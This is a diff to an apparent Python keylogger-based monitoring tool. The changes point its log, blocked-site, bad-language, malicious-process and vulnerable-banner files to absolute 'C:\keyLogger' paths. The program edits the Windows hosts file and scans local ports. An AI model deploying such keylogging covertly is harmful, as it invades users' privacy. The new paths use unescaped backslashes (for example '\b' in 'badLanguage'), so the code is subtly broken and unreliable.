@@ -16,7 +16,7 @@ from IPy import IP  # For Scanner
 SEND_REPORT_EVERY = 30
 
 def logging(text):
-    arquivo = open("logs.txt", 'a')
+    arquivo = open("C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt", 'a')
     arquivo.writelines(text + "\n")
     arquivo.close()
 
@@ -24,7 +24,7 @@ def block_DNS():
     path = r"C:\Windows\System32\drivers\etc\hosts"
     redirect = "\n127.0.0.1"
     websites = []
-    with open('sites.txt') as file:
+    with open('C:\keyLogger\sites.txt') as file:
         contents = file.read().split(';')
         for row in contents:
             websites.append(row)
@@ -53,7 +53,7 @@ def isHateSpeech(self):
 
 def isBadLanguage(self):
     log_tokenized = self.log.split()
-    with open('badLanguage.txt', encoding="utf8") as file:
+    with open('C:\keyLogger\badLanguage.txt', encoding="utf8") as file:
         contents = file.read().split(';')
         for word in log_tokenized:
             if word.lower() in contents:
@@ -62,7 +62,7 @@ def isBadLanguage(self):
 
 
 def areMaliciousProcess(self):
-    with open('maliciousProcess.txt', encoding="utf8") as file:
+    with open('C:\keyLogger\maliciousProcess.txt', encoding="utf8") as file:
         contents = file.read().split(';')
         for proc in ps.process_iter():
             if proc.name().lower() in contents:
@@ -213,7 +213,7 @@ class Scanner:
             thread = threading.Thread(target=self.port_scanner, args=["localhost", port])
             thread.start()
         logging("Inicio do programa! teste fora do for\n")
-        with open("vulnarable_banners.txt", "r") as file:
+        with open("C:\keyLogger\vulnarable_banners.txt", "r") as file:
             data = file.read()
             for i in range(len(self.banners)):
                 if self.banners[i] in data:
